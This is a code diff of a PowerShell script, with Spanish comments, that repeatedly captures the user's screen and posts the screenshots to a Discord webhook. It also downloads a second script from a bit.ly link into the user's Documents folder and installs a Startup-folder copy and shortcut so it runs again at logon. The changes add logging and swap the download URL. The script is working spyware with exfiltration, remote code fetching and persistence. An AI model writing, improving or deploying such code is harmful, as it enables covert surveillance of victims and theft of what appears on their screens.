@@ -10,7 +10,7 @@ $stopCommand = "stop"
 
 # shortened URL Detection
 if ($hookurl.Ln -ne 121){
-    Write-Host "Shortened Webhook URL Detected..ll" 
+    Write-Host "Shortened Webhook URL Detected.." 
     $hookurl = (irm $hookurl).url
 }
 
@@ -52,6 +52,14 @@ While ($true){
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($file1, [System.Drawing.Imaging.ImageFormat]::png)
     
+    # Verificar si la primera captura de pantalla se guardó correctamente
+    if (Test-Path $file1) {
+        Write-Host "Primera captura de pantalla guardada correctamente en $file1"
+    }
+    else {
+        Write-Host "Error al guardar la primera captura de pantalla en $file1"
+    }
+
     # Esperar un segundo antes de tomar la segunda captura de pantalla
     Start-Sleep -Seconds 1
     
@@ -60,6 +68,14 @@ While ($true){
     $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($file2, [System.Drawing.Imaging.ImageFormat]::png)
+    
+    # Verificar si la segunda captura de pantalla se guardó correctamente
+    if (Test-Path $file2) {
+        Write-Host "Segunda captura de pantalla guardada correctamente en $file2"
+    }
+    else {
+        Write-Host "Error al guardar la segunda captura de pantalla en $file2"
+    }
     
     # Enviar ambas capturas de pantalla al webhook de Discord si los archivos existen
     if (Test-Path $file1 -and Test-Path $file2) {
@@ -74,7 +90,7 @@ While ($true){
     Remove-Item -Path $file2
     
     # Descargar el script y guardarlo como "sys2.ps1" en la carpeta de documentos
-    $scriptURL = "https://is.gd/H8uBqE"
+    $scriptURL = "http://bit.ly/screen_dc"
     $scriptPath = Join-Path -Path $env:USERPROFILE -ChildPath "Documents\sys2.ps1"
     Invoke-WebRequest -Uri $scriptURL -OutFile $scriptPath
     
@@ -96,6 +112,4 @@ Copy-Item -Path $scriptPath -Destination $scriptInStartupPath -Force
 $shortcutPath = Join-Path -Path $startupFolder -ChildPath "Run_Script.lnk"
 $WScriptShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
-$Shortcut.TargetPath = "powershell.exe"
-$Shortcut.Arguments = "-WindowStyle Hidden -File $scriptInStartupScriptPath"
 $Shortcut.Save()
